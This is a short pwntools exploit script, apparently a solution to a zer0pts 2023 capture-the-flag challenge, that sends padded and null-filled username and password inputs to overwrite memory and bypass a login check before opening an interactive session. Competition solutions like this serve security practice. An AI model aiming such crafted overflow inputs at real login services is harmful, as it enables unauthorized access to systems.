from pwn import *

r = remote("pwn.2023.zer0pts.com", 9006)
r.recvuntil("Username: ")
r.sendline("A" * (0x200 - 0x60))
r.recvuntil("Password: ")
r.sendline("A" * (32) + "\x00" * (0x200 - 32 - 1))
r.interactive()
